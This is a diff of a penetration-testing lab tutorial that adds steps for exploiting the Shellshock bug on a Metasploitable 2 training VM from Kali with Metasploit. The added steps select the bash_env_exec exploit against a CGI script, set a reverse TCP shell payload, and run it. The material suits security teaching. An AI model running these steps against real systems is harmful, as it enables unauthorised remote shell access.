@@ -1,6 +1,6 @@
 # Hacking I (unprivileged permissions) 
 
-## Prepare the target (metasploitable 2) 
+## Todo 1: Prepare the target (metasploitable 2) 
 
 ```
 # metasploitable 2 should be up and running 
@@ -23,9 +23,37 @@ chmod 755 hello.sh
 http://192.168.10.x/cgi-bin/hello.sh 
 ```
 
+## Todo 2: Proceed on kali 
 
+```
+# Connect through ssh or use desktop -> terminal as root
+msfconsole 
+msf>search shellshock 
+msf>use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf.....>options
 
+# We need to set the path and the ip of the target (metaploitable 2) here.
+msf.....>set rhost 192.168.10.198
+msf.....>set targeturi /cgi-bin/hello.sh
+targeturi => /cgi-bin/hello.sh
 
+# Now we need to decide for a payload 
+msf.....>show payloads 
+msf.....>set payload linux/x86/shell/reverse_tcp
+payload => linux/x86/shell/reverse_tcp
+
+# let again check the options 
+msf.....>options 
+
+# now let's try if it would work 
+msf....>check 
+
+# now let's exploit
+msf....>exploit
+
+# Try to get some info now 
+whoami 
+```
 
 ## Ref: (normal privileges)
 
